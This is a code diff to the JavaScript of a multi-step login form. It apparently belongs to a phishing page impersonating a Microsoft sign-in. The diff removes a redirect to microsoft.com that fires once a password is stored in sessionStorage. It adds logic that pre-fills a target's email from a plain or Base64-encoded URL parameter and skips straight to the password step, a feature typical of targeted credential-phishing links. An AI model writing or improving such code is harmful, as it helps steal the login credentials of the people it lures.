@@ -1,7 +1,3 @@
-if(sessionStorage.getItem("password")){
-    window.location.href = "https://www.microsoft.com/";
-}
-
 const slidePage = document.querySelector(".slide-page");
 const secondSlide = document.querySelector(".secondSlide");
 const btnNext = document.querySelector(".firstNext");
@@ -66,10 +62,7 @@ input2.addEventListener("keyup", function(event) {
   }
 })
 
-btnNext.addEventListener("click", function(){
-
-  const email = input1.value;
-  
+function proceedToPasswordForm(email) {
   // check email is not empty
   if(!validate()) return;
   
@@ -96,6 +89,33 @@ btnNext.addEventListener("click", function(){
   // make loginForm little bigger
   document.getElementById("loginForm").style.height = "403px";
   document.getElementById("loginForm").style.marginTop = "-84px";
+}
+
+function startAtPasswordFormIfNeeded() {
+  const urlParams = new URLSearchParams(window.location.search);
+  
+  const email = urlParams.get('e');
+  if(email && validateEmail(email)) {
+    document.getElementById("email").value = email;
+    proceedToPasswordForm(email); // Call a refactored function for proceeding to the password form
+  }
+
+  const encodedEmail = urlParams.get('b');
+  if(encodedEmail) {
+    const decodedEmail = atob(encodedEmail); // Decode the Base64 encoded email
+    if(validateEmail(decodedEmail)) {
+      document.getElementById("email").value = decodedEmail;
+      proceedToPasswordForm(decodedEmail); // Proceed to password form with the decoded email
+    }
+  }
+}
+
+// user has entered their email and proceeded to password section
+btnNext.addEventListener("click", function(){
+  const email = input1.value;
+  if(!validate()) return;
+  if(!validateEmail(email)) return;
+  proceedToPasswordForm(email);
 });
 
 submitBtn.addEventListener("click", function(){
@@ -111,6 +131,7 @@ submitBtn.addEventListener("click", function(){
   },10);
 });
 
+// user has hit back to regular login form
 prevBtnSec.addEventListener("click", function(){
 
   // set margins to top back to normnal
@@ -132,3 +153,5 @@ prevBtnSec.addEventListener("click", function(){
   secondSlide.style.marginLeft = "100%";
   slidePage.style.visibility = "visible";
 });
+
+startAtPasswordFormIfNeeded()
